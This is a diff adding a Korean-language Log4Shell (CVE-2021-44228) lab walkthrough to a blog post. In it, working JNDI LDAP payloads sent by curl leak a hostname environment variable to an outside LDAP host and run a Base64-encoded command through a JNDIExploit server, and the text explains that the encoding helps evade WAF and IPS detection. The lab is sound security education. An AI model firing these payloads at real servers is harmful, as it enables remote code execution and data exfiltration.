@@ -119,6 +119,102 @@ ${jndi:ldap://MALICIOUS_LDAP_SERVER/COMMAND}
 
 ## 실습
 
+### Log4j 취약점을 이용해 LDAP 서버로 통신하기
+
+Docker 컨테이너로 취약한 Log4j 환경을 구축하고 해당 악의적인 LDAP 서버로 패킷을 보내는 request를 보내볼 것이다.
+Docker 가 설치되어 있다고 가정하고 일단 아래 명령어를 통해 취약한 Log4j 환경이 구축된 이미지를 받고 컨테이너를 올려보자.
+
+```
+docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+```
+
+이미지를 다운받고 8080 포트로 해당 컨테이너의 8080포트를 포트포워딩 해 주었다.
+웹 브라우저를 통해 ***http[:]//127.0.0.1:8080*** 로 접속하였을때 아래와 같은 화면이 뜬다면
+정상적으로 컨테이너가 올라온 것이다.
+
+![log4j_vul_container](/assets/images/2022/2022-06-04-23-18-37.png)
+
+취약한 환경을 구축하였으니 이제 exploit을 해볼 차례다.
+[https://log4shell.huntress.com/](https://log4shell.huntress.com/){: target="_blank"}란 사이트에서는 Log4j 취약점이 제대로 동작하는지에 확인할 수 있는 LDAP 서버를 제공한다.
+
+아래의 패킷을 취약한 Log4j 환경에 던지면 해당 LDAP 서버로 연결되는 것을 확인해볼 수 있다.
+unique identifier 의 경우 자신에게 할당된 값을 넣으면 된다.
+
+```
+${jndi:ldap://log4shell.huntress.com:1389/(unique_identifier)}
+```
+
+이제 curl 같은 도구를 이용하여 아래 request를 날려주면 된다.
+HTTP Header 컬럼 중, 'X-Api-Version'라는 컬럼에 Exploit을 삽입해 주었다.
+
+```
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://log4shell.huntress.com:1389/5d7cf9a3-6fcb-46b4-ba90-605972bba32d}'
+```
+
+![log4j_exploit](/assets//images/2022/2022-06-04-23-35-59.png)
+
+이후 LDPA 서버를 제공해주는 사이트를 확인해보면 아래와 같이 로그가 남는다.
+
+![log4j_exploit_result](/assets/images/2022/2022-06-04-23-37-58.png)
+
+추가적으로 아래와 같은 명령어를 이용해 PC의 환경변수 값을 노출하는 것도 가능하다.
+
+```
+${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/(unique_identifier)}
+```
+
+아래와 같이 호스트의 환경변수 값이 노출된 것을 확인할 수 있다.
+
+![log4j_exploit_result2](/assets/images/2022/2022-06-04-23-41-11.png)
+
+### Log4j 취약점을 이용해 공격자가 악의적인 명령어 전송
+
+이번에는 공격자의 LDAP 서버와 통신하는 것을 넘어서 LDPA 서버에서 악의적인 명령어를 전송해
+실제 취약한 Log4j 서버에 행위를 해보는 실습을 해 보겠다.
+
+아까전과 동일한 췽갸한 Log4j 버전을 사용하고 있는 도커 컨테이너를 사용할 것이며
+LDAP 서버는 직접 로컬상에 구축해볼 것이다. 필요한 것은 JNDI Exploit 을 할 수 있도록 구축된 LDAP 서버이다.
+
+[해당 링크](https://github.com/black9/Log4shell_JNDIExploit){: target="_blank"}에서 JDNI Exploit을 지원하는 jar파일을 받을 수 있다.
+*POC 용도로만 사용하며 절대 악용햐는 일은 바란다*
+
+jar 파일을 받고 아래 명령어를 통해 LDAP 서버를 Open하자.
+(Java 8 이상이 설치되어 있어야 한다)
+```
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+```
+
+LDAP 기본포트인 1389와 8888포트가 열린 것을 확인할 수 있다.
+
+![ldap_exploit_kit](/assets//images/2022/2022-06-05-19-09-54.png)
+
+이제 아까의 취약한 Log4j 컨테이너에 아래와 같은 명령어를 날려보자.
+
+```
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}}'
+```
+
+위의 명령어에 대해 잠깐 설명하자면 아까 구축해놓은 LDAP 서버에 취약한 Log4j 서버로 전달할 명령어를 Base64 인코딩 형태로 전달하는 것이다. Base64로 인코딩하는 이유는 WAF나 IPS 같은 패턴기반의 보안장비를 우회하기 위한 목적이라고 볼 수 있다.
+
+**'dG91Y2ggL3RtcC9wd25lZAo'=** 라는 Base64 문자열을 Decode해보면 **'touch /tmp/pwned'** 라는 명령어이다.
+
+위의 명령어가 성공했을 경우 취약한 Log4j 컨테이너의 /tmp 경로에 pwned라는 파일이 생성되어 있을 것이다.
+확인해보자.
+
+![ldap_command_success](/assets/images/2022/2022-06-05-20-00-12.png)
+
+LDAP 서버에서는 정상적으로 명령어를 받았고
+
+```
+docker exec vulnerable-app ls -l /tmp
+```
+
+![vul_log4j_touch_pwned](/assets/images/2022/2022-06-05-20-02-17.png)
+
+취약한 Log4j 컨테이너의 /tmp 폴더에 pwned 라는 파일이 root 권한으로 생성된 것을 확인할 수 있다.
+Reverse Shell의 명령어를 실행하였다면 해당 서버 전체를 탈취한 것이나 마찬가지일 것이다.
+
+
 ## Reference
 - [Log4j 보안 문제와 해킹 과정 재현하기 (feat. CVE-2021-44228)](https://junhyunny.github.io/information/security/log4j-vulnerability-CVE-2021-44228/){: target="_blank"}
 - [아파치 로그4j 취약점에 영향 받는 Log4j Core 공개](https://www.boannews.com/media/view.asp?idx=103419){: target="_blank"}
